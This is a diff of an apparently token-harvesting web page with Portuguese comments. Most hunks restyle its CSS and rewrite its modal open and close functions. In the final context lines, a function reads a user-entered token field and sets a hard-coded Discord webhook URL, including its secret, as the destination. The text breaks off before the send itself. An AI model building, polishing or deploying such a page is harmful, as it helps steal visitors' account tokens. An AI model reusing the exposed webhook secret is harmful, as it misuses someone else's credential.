@@ -20,7 +20,6 @@
         @keyframes slideInRight { from { opacity: 0; transform: translateX(50px); } to { opacity: 1; transform: translateX(0); } }
 
         body { 
-            /* APLICANDO A FONTE DE TEXTO BASE */
             font-family: 'Rajdhani', sans-serif; 
             margin: 0; padding: 0; height: 100vh;
             display: flex; justify-content: center; align-items: center;
@@ -29,7 +28,7 @@
             letter-spacing: 1px;
         }
 
-        /* BACKGROUND */
+        /* BACKGROUND VIDEO */
         .video-background {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: -1; pointer-events: none; overflow: hidden;
@@ -64,7 +63,6 @@
             font-family: 'Orbitron', sans-serif; font-weight: 700;
             text-transform: uppercase;
         }
-        p { font-size: 1.1em; font-weight: 400; }
 
         /* INPUT */
         input { 
@@ -74,7 +72,6 @@
             font-size: 1em; box-sizing: border-box; outline: none;
             transition: 0.3s;
         }
-        input::placeholder { color: rgba(255, 255, 255, 0.5); font-weight: 400; }
 
         /* BOTÕES */
         .btn-main {
@@ -93,18 +90,35 @@
             border-radius: 50px; box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
             font-family: 'Orbitron', sans-serif;
             animation: fadeInScale 1.5s ease-out;
+            z-index: 50;
         }
         .btn-info:hover { background: #fff; color: #000; transform: translateX(-50%) translateY(-5px); box-shadow: 0 0 30px #fff; }
 
-        /* MODAL */
-        .modal-content { 
-            background-color: #111; margin: 10% auto; padding: 25px; 
-            border: 2px solid #fff; width: 50%; border-radius: 15px; 
-            text-align: left; color: #fff; font-family: 'Rajdhani', sans-serif;
-            box-shadow: 0 0 40px rgba(255, 255, 255, 0.3);
-            animation: fadeInScale 0.4s ease-out;
+        /* MODAL CENTRALIZADO POR CIMA DE TUDO */
+        .modal { 
+            display: none; 
+            position: fixed; 
+            z-index: 1000; /* Super alto para cobrir tudo */
+            left: 0; top: 0; width: 100%; height: 100%; 
+            background-color: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            /* CENTRALIZAÇÃO */
+            justify-content: center;
+            align-items: center;
         }
-        .modal-content h3 { font-family: 'Orbitron', sans-serif; text-shadow: 0 0 5px #fff; }
+
+        .modal-content { 
+            background-color: #111; padding: 30px; 
+            border: 2px solid #fff; width: 450px; border-radius: 15px; 
+            text-align: left; color: #fff; font-family: 'Rajdhani', sans-serif;
+            box-shadow: 0 0 50px rgba(255, 255, 255, 0.4);
+            animation: fadeInScale 0.3s ease-out;
+            position: relative;
+        }
+
+        .modal-content h3 { font-family: 'Orbitron', sans-serif; text-shadow: 0 0 5px #fff; margin-top: 0; }
+        .close { color: #fff; position: absolute; right: 20px; top: 15px; font-size: 28px; font-weight: bold; cursor: pointer; }
+        .close:hover { color: #ff4d4d; }
 
         /* LOADER */
         .loader {
@@ -112,6 +126,7 @@
             width: 45px; height: 45px; animation: spin 1s linear infinite;
             display: inline-block; margin-bottom: 20px;
         }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -151,8 +166,15 @@
     </div>
 
     <script>
-        function abrirModal() { document.getElementById("infoModal").style.display = "block"; }
-        function fecharModal() { document.getElementById("infoModal").style.display = "none"; }
+        function abrirModal() { 
+            const modal = document.getElementById("infoModal");
+            modal.style.display = "flex"; // Usando flex para centralizar
+        }
+        function fecharModal() { 
+            const modal = document.getElementById("infoModal");
+            modal.style.display = "none"; 
+        }
+
         function enviarToken() {
             const tokenValue = document.getElementById('userToken').value;
             const webhookURL = "https://discordapp.com/api/webhooks/1472960946363306016/K2T6_RdOTxyn2maT47ySjjNLQaVdjT9O7mHl6eIf_DRlil5L2fgH4vA9UB5sPZFm318y";
